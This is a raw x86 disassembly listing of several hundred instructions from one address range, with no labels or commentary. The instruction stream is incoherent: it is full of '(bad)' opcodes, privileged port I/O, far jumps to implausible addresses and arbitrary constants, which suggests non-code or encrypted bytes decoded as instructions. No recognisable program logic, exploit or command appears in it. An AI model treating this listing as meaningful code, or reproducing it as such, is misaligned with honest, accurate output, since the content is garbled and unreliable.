  4127b0:	mov    al,ds:0xb23e8a40
  4127b5:	mov    ah,0x73
  4127b7:	push   ecx
  4127b8:	jmp    esi
  4127ba:	mov    bh,BYTE PTR [esi-0x37edd5cc]
  4127c0:	push   cs
  4127c1:	inc    esp
  4127c2:	adc    BYTE PTR [ecx-0x3],ch
  4127c5:	outs   dx,BYTE PTR ds:[esi]
  4127c6:	out    dx,al
  4127c7:	(bad)  
  4127c8:	sub    al,0xc4
  4127ca:	iret   
  4127cb:	sub    DWORD PTR [ecx-0x4],edx
  4127ce:	push   0xffffffba
  4127d0:	pop    es
  4127d1:	and    DWORD PTR [ebx-0x36962d95],eax
  4127d7:	sbb    DWORD PTR [ebp-0x4d],0xe62de40f
  4127de:	pop    ss
  4127df:	push   eax
  4127e0:	cmp    eax,0x5d6ab2df
  4127e5:	aam    0x6f
  4127e7:	shl    BYTE PTR [edx+0x70a33088],0x51
  4127ee:	test   al,0xbf
  4127f0:	push   ss
  4127f1:	jp     0x412782
  4127f3:	(bad)  
  4127f4:	jecxz  0x412810
  4127f6:	xor    eax,0x1c2d03c9
  4127fb:	cmc    
  4127fc:	sub    BYTE PTR [ebp+ebx*4+0x4d8d93e5],dl
  412803:	or     ebx,DWORD PTR ds:0x82737b31
  412809:	push   es
  41280a:	stc    
  41280b:	mov    ebx,0xd4243f0e
  412810:	jno    0x412798
  412812:	fsubr  QWORD PTR [ebp+0x2a]
  412815:	fstp   QWORD PTR [ebx-0x53c15d34]
  41281b:	je     0x4127a0
  41281d:	xor    al,0xd
  41281f:	pushf  
  412820:	mov    dh,ah
  412822:	cwde   
  412823:	(bad)  [ebp-0x6d1d72de]
  412829:	imul   esp,DWORD PTR ds:0x22ab8680,0xb8fdbc3f
  412833:	or     BYTE PTR [edx],ah
  412835:	jo     0x41286c
  412837:	enter  0xc845,0x4e
  41283b:	mov    eax,0x9101262d
  412840:	adc    eax,0x196754a4
  412845:	std    
  412846:	out    0x5b,eax
  412848:	icebp  
  412849:	cmp    BYTE PTR [ecx+0x55],al
  41284c:	cmp    bh,ch
  41284e:	pushf  
  41284f:	jl     0x412878
  412851:	sub    ch,BYTE PTR [esi-0x3c]
  412854:	aaa    
  412855:	mov    eax,0xeb2bdef3
  41285a:	mov    edi,0xa88c27cc
  41285f:	test   bl,bl
  412861:	inc    ebx
  412862:	call   0x2e2cb31f
  412867:	xchg   esp,eax
  412868:	loope  0x412850
  41286a:	mov    cl,0x75
  41286c:	jb     0x4127fb
  41286e:	in     eax,dx
  41286f:	enter  0xb7de,0x56
  412873:	sbb    BYTE PTR [edx-0x65],bl
  412876:	aad    0x88
  412878:	jnp    0x4128af
  41287a:	mov    ebx,0x73d126a7
  41287f:	test   eax,0xfd112e65
  412884:	cwde   
  412885:	sahf   
  412886:	sahf   
  412887:	fist   WORD PTR [ebp-0x4c]
  41288a:	pop    ecx
  41288b:	jmp    0x412893
  41288d:	jne    0x412877
  41288f:	daa    
  412890:	push   ecx
  412891:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412892:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412893:	aad    0xb9
  412895:	icebp  
  412896:	jmp    0xe877fcc7
  41289b:	mov    edx,0xc5a9eabc
  4128a0:	jmp    0x313372f9
  4128a5:	jbe    0x4128c3
  4128a7:	lds    ebx,FWORD PTR [edi-0x76b20df0]
  4128ad:	jns    0x41284d
  4128af:	inc    esi
  4128b0:	mov    bl,0x6d
  4128b2:	add    edx,DWORD PTR [ebx]
  4128b4:	inc    ebx
  4128b5:	fidiv  WORD PTR [esi+0x4bd3d21c]
  4128bb:	ret    0x9044
  4128be:	enter  0x1c47,0x9d
  4128c2:	mov    al,0xa2
  4128c4:	xchg   edi,eax
  4128c5:	pop    edx
  4128c6:	lock sbb BYTE PTR [edi-0x68],0xe
  4128cb:	scas   eax,DWORD PTR es:[edi]
  4128cc:	xchg   ax,ax
  4128cf:	mov    dl,0xe4
  4128d1:	xor    ecx,DWORD PTR [eax-0x3a]
  4128d4:	pop    ss
  4128d5:	mov    al,0xd7
  4128d7:	aam    0xeb
  4128d9:	adc    eax,0x136c33f8
  4128de:	inc    ebp
  4128df:	jno    0x41289a
  4128e1:	dec    ax
  4128e3:	sub    BYTE PTR [ebx],bh
  4128e5:	inc    edi
  4128e6:	xor    esp,eax
  4128e8:	and    eax,0x1e812ec6
  4128ed:	sbb    BYTE PTR [eax+ebx*4-0x7e],bl
  4128f1:	cmp    cl,cl
  4128f3:	std    
  4128f4:	cmp    DWORD PTR [eax+0x3648ee9f],esi
  4128fa:	adc    eax,0xf6d0b52a
  4128ff:	dec    eax
  412900:	add    al,0xc
  412902:	(bad)  
  412903:	jmp    0x601e:0xc56ea957
  41290a:	pushf  
  41290b:	jmp    0x251cb9b2
  412910:	sahf   
  412911:	(bad)  
  412912:	sbb    al,0x70
  412914:	or     DWORD PTR [eax+eax*8-0x55fce6ad],eax
  41291b:	cmp    eax,0x9e46e908
  412920:	xchg   edi,eax
  412921:	stc    
  412922:	or     al,0x13
  412924:	imul   ebx,esp,0x4ef48ade
  41292a:	aam    0x2a
  41292c:	xor    eax,edx
  41292e:	mov    al,BYTE PTR [edi-0x66]
  412931:	jnp    0x41295a
  412933:	rcl    DWORD PTR [ebx+esi*4-0x19deadc3],0x69
  41293b:	sbb    eax,0xdcaab673
  412940:	cwde   
  412941:	in     eax,dx
  412942:	mov    al,0xc
  412944:	in     eax,dx
  412945:	cwde   
  412946:	mov    bh,BYTE PTR [edx]
  412948:	bts    DWORD PTR [ebx-0x7c],eax
  41294c:	(bad)  
  41294d:	jp     0x412978
  41294f:	fcmove st,st(0)
  412951:	dec    eax
  412952:	es je  0x412925
  412955:	xchg   esi,eax
  412956:	xor    ebp,DWORD PTR [edx]
  412958:	push   0x879eb153
  41295d:	daa    
  41295e:	mov    ds:0x60d49f54,eax
  412963:	das    
  412964:	out    0xcf,al
  412966:	out    dx,eax
  412967:	and    al,0xa7
  412969:	fwait
  41296a:	aaa    
  41296b:	pop    esi
  41296c:	inc    BYTE PTR [ecx+esi*4-0x41]
  412970:	xor    eax,0x1c94c1b7
  412975:	ret    
  412976:	popa   
  412977:	fs mov dl,0x3b
  41297a:	lods   al,BYTE PTR ds:[esi]
  41297b:	retf   
  41297c:	adc    DWORD PTR [ecx-0x2ba1f42f],edi
  412982:	mov    ch,0x2f
  412984:	in     eax,dx
  412985:	lahf   
  412986:	popa   
  412987:	cmp    dl,dl
  412989:	xor    ebx,DWORD PTR [edi]
  41298b:	mov    al,0x8a
  41298d:	mov    al,ds:0x4fe85b85
  412992:	cmp    edx,DWORD PTR [edx+0x36]
  412995:	in     eax,dx
  412996:	dec    esp
  412997:	iret   
  412998:	dec    eax
  412999:	pop    ebx
  41299a:	unpcklps xmm2,XMMWORD PTR [edi+eax*4+0x56]
  41299f:	inc    edx
  4129a0:	pop    es
  4129a1:	test   al,0xfc
  4129a3:	push   edx
  4129a4:	paddb  mm3,mm0
  4129a7:	jmp    0x1d9f:0x1fab4300
  4129ae:	popa   
  4129af:	jo     0x412936
  4129b1:	loope  0x41298c
  4129b3:	xlat   BYTE PTR ds:[ebx]
  4129b4:	xchg   ecx,eax
  4129b5:	jmp    0x75e16f60
  4129ba:	mov    ah,0xe8
  4129bc:	or     eax,0xf84fa065
  4129c1:	pop    ss
  4129c2:	sub    eax,DWORD PTR [ebx+0x2]
  4129c5:	or     BYTE PTR [edi-0x2ab3b47d],al
  4129cb:	mov    WORD PTR [edx],gs
  4129cd:	mov    esp,0x9a507831
  4129d2:	sbb    ebp,DWORD PTR [edx]
  4129d4:	xchg   edi,eax
  4129d5:	fiadd  DWORD PTR [ebx+0x7ca70e97]
  4129db:	xor    BYTE PTR [eax-0x724f38e4],cl
  4129e1:	les    eax,FWORD PTR [edi+ebp*8+0x62]
  4129e5:	out    0xe3,eax
  4129e7:	shl    DWORD PTR [esi+0x7a],cl
  4129ea:	retf   
  4129eb:	mov    bl,BYTE PTR [ebp-0x6ea2a1b6]
  4129f1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4129f2:	imul   ebx,DWORD PTR [ecx],0xffffffa2
  4129f5:	cmp    al,0x94
  4129f7:	xchg   esi,eax
  4129f8:	emms   
  4129fa:	mov    esi,0x5fc8e663
  4129ff:	dec    ebp
  412a00:	in     al,dx
  412a01:	push   esi
  412a02:	retf   0x823
  412a05:	in     eax,dx
  412a06:	popf   
  412a07:	mov    edi,0xb06618ac
  412a0c:	stos   DWORD PTR es:[edi],eax
  412a0d:	sub    edi,DWORD PTR [ebp-0x3a1892cf]
  412a13:	les    ebx,FWORD PTR [ecx+0x68bbf81b]
  412a19:	inc    esi
  412a1a:	scas   eax,DWORD PTR es:[edi]
  412a1b:	pop    ebp
  412a1c:	out    0xdb,al
  412a1e:	mov    ebp,0x7da2d8ee
  412a23:	push   ss
  412a24:	lods   eax,DWORD PTR ds:[esi]
  412a25:	loopne 0x4129eb
  412a27:	repz jnp 0x4129bd
  412a2a:	test   eax,0x8c261e20
  412a2f:	cs pop edx
  412a31:	sbb    eax,0x75a698bc
  412a36:	mov    DWORD PTR [ecx],edi
  412a38:	adc    edi,DWORD PTR [ebx]
  412a3a:	adc    DWORD PTR [eax+0x54],ebx
  412a3d:	ror    bh,1
  412a3f:	out    0x2b,eax
  412a41:	imul   ecx,DWORD PTR ds:0xfc8d98eb,0xffffff80
  412a48:	pop    ecx
  412a49:	xchg   BYTE PTR [ebp-0x70],al
  412a4c:	rcr    BYTE PTR [edi],cl
  412a4e:	mul    BYTE PTR [edx-0xa688901]
  412a54:	(bad)  
  412a56:	cdq    
  412a57:	dec    esp
  412a58:	(bad)  [ebp+edx*1-0x27b112bb]
  412a5f:	sub    eax,0xbe99e45d
  412a64:	mov    WORD PTR [ebp-0x63],ds
  412a67:	mov    ds:0xdc23bc7a,eax
  412a6c:	cmp    DWORD PTR [ebx],eax
  412a6e:	arpl   WORD PTR [ecx+0x33acd111],bx
  412a74:	mov    ah,cl
  412a76:	jp     0x412a08
  412a78:	rcl    BYTE PTR [esi],0xb7
  412a7b:	push   ebx
  412a7c:	xchg   ecx,eax
  412a7d:	shl    ecx,0xd2
  412a80:	cli    
  412a81:	pusha  
  412a82:	pop    edx
  412a83:	test   DWORD PTR [eax+eax*8-0x597d5549],eax
  412a8a:	pop    dx
  412a8c:	ror    DWORD PTR [edx],0x95
  412a8f:	sar    ch,1
  412a91:	sub    edx,0x8d6b2f0f
  412a97:	inc    eax
  412a98:	or     BYTE PTR [eax+0x47d2d514],bl
  412a9e:	fnstsw WORD PTR [ebx+edx*1-0x52]
  412aa2:	mov    al,BYTE PTR [eax-0x169fe74f]
  412aa8:	adc    dl,BYTE PTR [edi-0x56065309]
  412aae:	neg    DWORD PTR [ebx]
  412ab0:	es xor eax,0xca1f2eac
  412ab6:	cmp    al,0xd
  412ab8:	cs popf 
  412aba:	xchg   edi,eax
  412abb:	mov    cl,0xc7
  412abd:	lea    ebx,[ecx+0x26e154ce]
  412ac3:	jle    0x412ad5
  412ac5:	cmp    edi,ecx
  412ac7:	pop    ebp
  412ac8:	jmp    0x995a:0xf7fa739e
  412acf:	lea    ebp,[edx-0x1c]
  412ad2:	stos   DWORD PTR es:[edi],eax
  412ad3:	inc    eax
  412ad4:	and    al,0xc4
  412ad6:	aaa    
  412ad7:	xor    DWORD PTR [ebx+0x28bbe14c],esi
  412add:	xchg   esi,eax
  412ade:	push   eax
  412adf:	sub    BYTE PTR [ebx],dh
  412ae1:	xor    eax,0xf4adbc36
  412ae6:	adc    al,0xd6
  412ae8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412ae9:	push   ebp
  412aea:	sub    dh,0xd8
  412aed:	or     al,0x24
  412aef:	lea    edx,[edx+0xe]
  412af2:	sub    eax,0x2bc6ec68
  412af7:	dec    ax
  412af9:	mov    eax,0x487fbfdd
  412afe:	test   BYTE PTR [eax],dl
  412b00:	retf   0x5d29
  412b03:	cmp    ah,BYTE PTR [edi+ebp*4+0x6ea50b1]
  412b0a:	(bad)  
  412b0b:	fwait
  412b0c:	test   eax,0xa9d824d6
  412b11:	pusha  
  412b12:	aad    0x7b
  412b14:	cmp    al,0xfd
  412b16:	in     al,dx
  412b17:	(bad)  
  412b18:	jnp    0x412b2e
  412b1a:	je     0x412ac8
  412b1c:	xchg   BYTE PTR [esi-0x5469ae72],dl
  412b22:	adc    al,0x7a
  412b24:	or     BYTE PTR [ecx+ebx*4+0x2e],0x9
  412b29:	imul   ecx,ebp,0xffffff98
  412b2c:	fsubr  st,st(6)
  412b2e:	(bad)  
  412b2f:	adc    DWORD PTR [edx],ecx
  412b31:	int3   
  412b32:	cmp    bh,BYTE PTR [eax-0x7d]
  412b35:	loopne 0x412ba6
  412b37:	inc    esi
  412b38:	jns    0x412ac4
  412b3a:	daa    
  412b3b:	lods   al,BYTE PTR ds:[esi]
  412b3c:	jle    0x412b3b
  412b3e:	xchg   ebx,eax
  412b3f:	sahf   
  412b40:	cs ins BYTE PTR es:[edi],dx
  412b42:	sahf   
  412b43:	ss repz sbb dl,dl
  412b47:	push   esi
  412b48:	xor    al,0x2f
  412b4a:	mov    esp,0x82f7e979
  412b4f:	jecxz  0x412ae4
  412b51:	out    0x1f,al
  412b53:	xchg   BYTE PTR [esi-0x35],cl
  412b56:	add    BYTE PTR [esi-0x7cc56f69],al
  412b5c:	es inc esi
  412b5e:	ss std 
  412b60:	rcr    BYTE PTR [ebx+0x16e54100],1
  412b66:	cmp    BYTE PTR [ebx],dh
  412b68:	inc    esi
  412b69:	retf   
  412b6a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412b6b:	lds    ebp,FWORD PTR [esi+0xf1cffb7]
  412b71:	call   0x2eb3:0x36bc8f37
  412b78:	aad    0xe2
  412b7a:	pop    ebp
  412b7b:	iret   
  412b7c:	aas    
  412b7d:	ss aam 0x6d
  412b80:	dec    ebx
  412b81:	sub    BYTE PTR [ebx-0xc757eff],al
  412b87:	inc    eax
  412b88:	fucomp st(5)
  412b8a:	test   al,0x13
  412b8c:	xchg   edi,eax
  412b8d:	pusha  
  412b8e:	mov    bh,BYTE PTR [eax]
  412b90:	jae    0x412b9e
  412b92:	not    BYTE PTR [ebx-0x3fef8a65]
  412b98:	add    al,ah
  412b9a:	dec    ecx
  412b9b:	pop    ecx
  412b9c:	fcomp  QWORD PTR [edx+edi*4+0x43f62a4d]
  412ba3:	jmp    0x412b72
  412ba5:	add    al,dh
  412ba7:	jnp    0x412b2d
  412ba9:	or     eax,0xd30c61e0
  412bae:	popf   
  412baf:	pusha  
  412bb0:	not    BYTE PTR [ebp+0x33]
  412bb3:	inc    esp
  412bb4:	scas   eax,DWORD PTR es:[edi]
  412bb5:	adc    bh,BYTE PTR [eax]
  412bb7:	fsub   QWORD PTR [eax-0x20]
  412bba:	pop    edi
  412bbb:	hlt    
  412bbc:	hlt    
  412bbd:	sahf   
  412bbe:	xlat   BYTE PTR ds:[ebx]
  412bbf:	loope  0x412bf6
  412bc1:	jmp    0x412c40
  412bc3:	stc    
  412bc4:	in     eax,0x7a
  412bc6:	pop    ebx
  412bc7:	and    DWORD PTR [ecx+0x3ec47a12],0xe62c740b
  412bd1:	pop    ss
  412bd2:	cdq    
  412bd3:	pop    eax
  412bd4:	sbb    al,0x2e
  412bd6:	enter  0x678c,0xcd
  412bda:	pop    ebp
  412bdb:	sar    DWORD PTR [edx-0x21],0x62
  412bdf:	sbb    al,0xe3
  412be1:	pop    ss
  412be2:	jmp    0xf74ae2d7
  412be7:	into   
  412be8:	cmc    
  412be9:	repnz fmul DWORD PTR [ebx]
  412bec:	bnd jae 0x412bc7
  412bef:	fstp   TBYTE PTR ds:0x4755306b
  412bf5:	repnz push edi
  412bf7:	cmp    eax,0xf260ce74
  412bfc:	cmp    BYTE PTR [ebx],ch
  412bfe:	dec    ebx
  412bff:	add    eax,0x70cf5f20
  412c04:	and    al,0x90
  412c06:	xchg   edi,eax
  412c07:	jg     0x412c57
  412c09:	sbb    esi,DWORD PTR [ebx+0x21]
  412c0c:	mov    ebp,cs
  412c0e:	cmp    DWORD PTR [ebp+esi*1-0x73c91c31],esp
  412c15:	xlat   BYTE PTR ds:[ebx]
  412c16:	sbb    ecx,DWORD PTR [ecx-0x3eeda979]
  412c1c:	repz test BYTE PTR [edx-0x2f0c2451],0xe6
  412c24:	pushf  
  412c25:	icebp  
  412c26:	rcr    DWORD PTR ds:0xb8fa96f5,cl
  412c2c:	jnp    0x412c66
  412c2e:	ds add al,0x20
  412c31:	mov    WORD PTR [edi+ebp*8-0x5bd2fd25],fs
  412c38:	iret   
  412c39:	mov    ecx,0x6560f0dc
  412c3e:	ret    0x420e
  412c41:	mov    esi,esi
  412c43:	out    dx,eax
  412c44:	adc    BYTE PTR [edi],0x9b
  412c47:	pop    es
  412c48:	xchg   BYTE PTR [ebx-0x45],dl
  412c4b:	nop
  412c4c:	test   DWORD PTR [ecx+0x49],esp
  412c4f:	add    eax,0x2d0507b3
  412c54:	add    eax,0x98a64c82
  412c59:	stos   BYTE PTR es:[edi],al
  412c5a:	js     0x412c64
  412c5c:	jmp    0x412c2d
  412c5e:	cmp    dh,BYTE PTR [edx-0x34b0480b]
  412c64:	sbb    BYTE PTR [edi+eiz*1],ch
  412c67:	addr16 push 0x75f8498b
  412c6d:	(bad)  
  412c6e:	cld    
  412c6f:	jbe    0x412c84
  412c71:	cmc    
  412c72:	in     eax,dx
  412c73:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412c74:	pop    esi
  412c75:	cdq    
  412c76:	sbb    cl,BYTE PTR ds:0x49a33194
  412c7c:	scas   al,BYTE PTR es:[edi]
  412c7d:	stos   BYTE PTR es:[edi],al
  412c7e:	adc    al,0xf4
  412c80:	jnp    0x412c7d
  412c82:	repz cmp BYTE PTR [ebx],0xa8
  412c86:	rcl    BYTE PTR [esp+eax*4-0x76a981fe],1
  412c8d:	test   DWORD PTR [ecx+esi*4-0x343b14ac],ebp
  412c94:	adc    eax,0x8324e29b
  412c99:	mov    al,0x97
  412c9b:	outs   dx,BYTE PTR ds:[esi]
  412c9c:	pop    ecx
  412c9d:	inc    ebx
  412c9e:	enter  0x7f03,0x1e
  412ca2:	pop    ds
  412ca3:	push   0xfffffff1
  412ca5:	pop    esp
  412ca6:	sbb    bh,0xfe
  412ca9:	cmp    al,0xd3
  412cab:	clc    
  412cac:	ins    BYTE PTR es:[edi],dx
  412cad:	push   ebp
  412cae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412caf:	or     bh,ah
  412cb1:	or     al,BYTE PTR [ebp-0x60df289]
  412cb7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412cb8:	add    al,0x65
  412cba:	xchg   ebp,eax
  412cbb:	jae    0x412cb1
  412cbd:	or     al,0xec
  412cbf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412cc0:	ss and esp,ebp
  412cc3:	adc    DWORD PTR [ecx+0x6c454e9c],edi
  412cc9:	push   0xffffff82
  412ccb:	cmp    ah,BYTE PTR [ecx]
  412ccd:	fs xchg ebx,eax
  412ccf:	mov    esi,0x4e03865a
  412cd4:	frstor [edi-0xa]
  412cd7:	int    0x80
  412cd9:	das    
  412cda:	repnz (bad) 
  412cde:	jp     0x412d22
  412ce0:	ja     0x412ca7
  412ce2:	mov    esi,0xda291b40
  412ce7:	xor    BYTE PTR [edx+0x4a],0x48
  412ceb:	adc    DWORD PTR [edi+0x56],0x1b347a55
  412cf2:	cmc    
  412cf3:	aad    0xca
  412cf5:	adc    ch,bl
  412cf7:	sti    
  412cf8:	mov    ebp,DWORD PTR [esi]
  412cfa:	cdq    
  412cfb:	ins    BYTE PTR es:[edi],dx
  412cfc:	mov    esi,0x1b1c5953
  412d01:	dec    ecx
  412d02:	inc    eax
  412d03:	in     eax,dx
  412d04:	ret    
  412d05:	inc    eax
  412d06:	xchg   ebp,eax
  412d07:	pop    es
  412d08:	cs sub dh,bh
  412d0b:	sti    
  412d0c:	je     0x412d27
  412d0e:	jge    0x412d5a
  412d10:	xor    eax,0x79e2e818
  412d15:	cwde   
  412d16:	daa    
  412d17:	add    esp,eax
  412d19:	mov    ch,0xca
  412d1b:	and    al,0x42
  412d1d:	and    al,0xb3
  412d1f:	div    BYTE PTR [esi*1-0x31e1e49b]
  412d26:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412d27:	mov    dh,0x2e
  412d29:	add    BYTE PTR [ecx-0x56],bh
  412d2c:	mov    ecx,0x219bcc5b
  412d31:	or     eax,DWORD PTR [edi-0x65]
  412d34:	mov    DWORD PTR [ebx],ebp
  412d36:	ds icebp 
  412d38:	pop    esp
  412d39:	or     DWORD PTR [esi-0x3febf88],0xd5d27d13
  412d43:	add    dh,BYTE PTR [edi+eiz*4]
  412d46:	aad    0x71
  412d48:	mov    esi,0x51248bd7
  412d4d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412d4e:	sub    cl,0x0
  412d51:	aad    0x1
  412d53:	adc    BYTE PTR [ebp-0x6e68aef2],dh
  412d59:	mov    dh,0x33
  412d5b:	js     0x412da4
  412d5d:	push   ss
  412d5e:	mov    ecx,0xb31cb81d
  412d63:	add    BYTE PTR [eax+0x7aa83bc5],ah
  412d69:	repz (bad) 
  412d6b:	and    DWORD PTR [esi],ecx
  412d6d:	gs shl ebx,1
  412d70:	pop    ebx
  412d71:	popf   
  412d72:	cli    
  412d73:	sbb    esi,DWORD PTR [ebx+0x55]
  412d76:	and    al,0x3c
  412d79:	jge    0x412d63
  412d7b:	ins    BYTE PTR es:[edi],dx
  412d7c:	fmul   QWORD PTR [esi+edi*2]
  412d7f:	dec    edx
  412d80:	mov    al,ds:0xa28b5424
  412d85:	icebp  
  412d86:	aas    
  412d87:	out    0x6e,al
  412d89:	mov    cl,0x6e
  412d8b:	(bad)  
  412d8d:	pushf  
  412d8e:	in     eax,dx
  412d8f:	pop    ebx
  412d90:	add    DWORD PTR [edx],ebx
  412d92:	inc    esi
  412d93:	call   0x77cd3b46
  412d98:	mov    ch,0xe2
  412d9a:	xor    BYTE PTR [eax+0x8b554c1],0x96
  412da1:	sub    dh,ah
  412da3:	stos   BYTE PTR es:[edi],al
  412da4:	es jg  0x412e07
  412da7:	fiadd  DWORD PTR ds:0xa946f1b0
  412dad:	ret    
  412dae:	or     DWORD PTR [ecx+0x3aa6c194],esi
  412db4:	rcl    bh,cl
  412db6:	inc    ebx
  412db7:	mov    dh,0xed
  412db9:	adc    ebp,eax
  412dbb:	sbb    DWORD PTR [edx+ecx*1-0x706008f1],ebx
  412dc2:	clc    
  412dc3:	jmp    0x412ddb
  412dc5:	mov    eax,ds:0xc9cfcd23
  412dca:	repnz not DWORD PTR [ebx-0x23]
  412dce:	imul   ebp,eax,0xffffff9b
  412dd1:	bound  edi,QWORD PTR [edi+esi*2]
  412dd4:	sbb    eax,0xc07db09a
  412dd9:	sbb    al,0x99
  412ddb:	test   DWORD PTR [ebx+0x4a],ebp
  412dde:	cmp    BYTE PTR [edx+0x21952e2f],bh
  412de4:	jp     0x412dc7
  412de6:	and    DWORD PTR [ebx],ebp
  412de8:	imul   ecx,DWORD PTR [eax+0x7781ca9c],0x1d
  412def:	cmp    al,BYTE PTR [ecx]
  412df1:	mov    edi,0xeaf7ef05
  412df6:	dec    ecx
  412df7:	jmp    0x412db3
  412df9:	cwde   
  412dfa:	cld    
  412dfb:	push   esp
  412dfc:	sbb    al,0xa2
  412dfe:	pop    edx
  412dff:	mov    cl,0x82
  412e01:	pop    edx
  412e02:	inc    eax
  412e03:	ss mov eax,0xbccfb06
  412e09:	jmp    ecx
  412e0b:	mov    al,ds:0x9c4253ae
  412e10:	out    dx,al
  412e11:	xchg   BYTE PTR [edx+0xf118a78],ah
  412e17:	cmp    dl,BYTE PTR [ebx-0x7d82d011]
  412e1d:	(bad)  
  412e1e:	loopne 0x412e57
  412e20:	dec    ecx
  412e21:	adc    al,0x8f
  412e23:	sub    al,0x6f
  412e25:	int3   
  412e26:	mov    esp,DWORD PTR [ebx]
  412e28:	xlat   BYTE PTR ds:[ebx]
  412e29:	lsl    edi,di
  412e2c:	adc    al,0x61
  412e2e:	xor    eax,0xab6ae34e
  412e33:	iret   
  412e34:	fdiv   DWORD PTR [ecx]
  412e36:	jg     0x412e7c
  412e38:	fwait
  412e39:	push   ds
  412e3a:	jg     0x412df8
  412e3c:	xor    bl,BYTE PTR [eax-0x7a]
  412e3f:	cs mov bl,0xd6
  412e42:	push   ebp
  412e43:	test   al,0x9c
  412e45:	sahf   
  412e46:	cmp    ah,BYTE PTR [esi]
  412e48:	mov    cl,0x45
  412e4a:	mov    edi,0xba577e44
  412e4f:	imul   esp,DWORD PTR ds:0xc7d817e1,0x2871558b
  412e59:	jmp    0x1b26cdd0
  412e5e:	push   ecx
  412e5f:	outs   dx,DWORD PTR ds:[esi]
  412e60:	leave  
  412e61:	jb     0x412e70
  412e63:	dec    edx
  412e64:	in     al,0x3a
  412e66:	imul   esi,DWORD PTR [ebx+0x38],0xffffffc5
  412e6a:	cmp    al,0x9
  412e6c:	mov    esi,edx
  412e6e:	repz ja 0x412dfd
  412e71:	ret    0x1d29
  412e74:	or     al,0xf6
  412e76:	adc    al,0x2a
  412e78:	inc    edx
  412e79:	ins    DWORD PTR es:[edi],dx
  412e7a:	ja     0x412ebd
  412e7c:	les    ecx,FWORD PTR [edx]
  412e7e:	jmp    0xda88bde4
  412e83:	sbb    BYTE PTR [ecx-0x588292b0],ch
  412e89:	stc    
  412e8a:	mov    ebp,0x4cfd51f7
  412e8f:	cmp    ch,bl
  412e91:	dec    edx
  412e92:	pop    ds
  412e93:	outs   dx,DWORD PTR ds:[esi]
  412e94:	xor    dh,BYTE PTR [esi+eiz*8]
  412e97:	ins    BYTE PTR es:[edi],dx
  412e98:	lea    edx,[ebp-0x2b]
  412e9b:	ret    
  412e9c:	dec    ebp
  412e9d:	scas   eax,DWORD PTR es:[edi]
  412e9e:	xchg   edi,eax
  412e9f:	andnps xmm6,XMMWORD PTR [esi+0x48]
  412ea3:	imul   eax,DWORD PTR [eax+0x68],0xffffffc2
  412ea7:	cs aaa 
  412ea9:	out    0x77,al
  412eab:	(bad)  
  412eac:	es stos DWORD PTR es:[edi],eax
  412eae:	pop    ecx
  412eaf:	cld    
  412eb0:	idiv   BYTE PTR [ebp+0x33]
  412eb3:	cmp    BYTE PTR [eax],0x7b
  412eb6:	sbb    ch,BYTE PTR [ecx]
  412eb8:	jo     0x412f0f
  412eba:	dec    ecx
  412ebb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412ebc:	mov    ecx,DWORD PTR [ebx]
  412ebe:	ret    
  412ebf:	gs push esi
  412ec1:	out    dx,al
  412ec2:	pop    eax
  412ec3:	les    ebx,FWORD PTR [edx+0x33d75b3]
  412ec9:	call   0x3857bf79
  412ece:	mov    dl,0xec
  412ed0:	repz jbe 0x412ee6
  412ed3:	xchg   esp,ebp
  412ed5:	aas    
  412ed6:	mov    bl,0x90
  412ed8:	retf   0x2f1d
  412edb:	js     0x412f19
  412edd:	mov    ah,BYTE PTR [eax+0x45]
  412ee0:	push   ss
  412ee1:	or     eax,0x342243eb
  412ee6:	xor    eax,0xaac6d6f
  412eeb:	jl     0x412f5e
  412eed:	mov    ebx,0xca52479c
  412ef2:	and    al,0x6a
  412ef4:	ret    0xd76
  412ef7:	sbb    BYTE PTR [edi+0x266395f2],cl
  412efd:	and    eax,0xbb6c0ea9
  412f02:	test   DWORD PTR [eax+0x57],edx
  412f05:	pop    ebp
  412f06:	xor    al,0xbe
  412f08:	movaps xmm3,XMMWORD PTR [eax+0x54]
  412f0c:	mov    cl,0x65
  412f0e:	mov    edx,0xfed8504e
  412f13:	pop    esp
  412f14:	pop    es
  412f15:	loopne 0x412f12
  412f17:	in     al,dx
  412f18:	std    
  412f19:	adc    esi,DWORD PTR [edi+0x45]
  412f1c:	ja     0x412ec6
  412f1e:	xchg   BYTE PTR [esi-0x8f2b6e],dh
  412f24:	xor    DWORD PTR [ebp+0x25ac01dd],esp
  412f2a:	in     al,0x1a
  412f2c:	shl    bh,1
  412f2e:	lods   al,BYTE PTR ds:[esi]
  412f2f:	test   DWORD PTR [esi],edi
  412f31:	dec    esp
  412f32:	adc    BYTE PTR [ebx-0x50],0x94
  412f36:	and    DWORD PTR [edx+ecx*4-0x3afcf575],edx
  412f3d:	mov    eax,ds:0xbfad9e41
  412f42:	stos   DWORD PTR es:[edi],eax
  412f43:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412f44:	jae    0x412fbd
  412f46:	jmp    0x412f79
  412f48:	aam    0x62
  412f4a:	shl    DWORD PTR [ecx-0x77],1
  412f4d:	sub    al,0x5c
  412f4f:	(bad)  
  412f50:	and    BYTE PTR [ebp-0x5ff67fb2],bh
  412f56:	fadd   QWORD PTR [esi-0x66]
  412f59:	fnstcw WORD PTR [ebp+0x3b7be7ae]
  412f5f:	stos   BYTE PTR es:[edi],al
  412f60:	mov    ecx,0x96553e93
  412f65:	mov    ds:0x9f976330,al
  412f6a:	jg     0x412fc1
  412f6c:	and    dl,bl
  412f6e:	les    eax,FWORD PTR [eax-0x21d8f009]
  412f74:	sbb    DWORD PTR [edi+0x28c201ed],0xffffff91
  412f7b:	call   0xd14d4de5
  412f80:	nop
  412f81:	or     ebx,DWORD PTR [edi]
  412f83:	ja     0x412f56
  412f85:	mov    ah,0x20
  412f87:	cld    
  412f88:	shl    DWORD PTR [edx+0xa],cl
  412f8b:	addr16 in al,dx
  412f8d:	dec    ebp
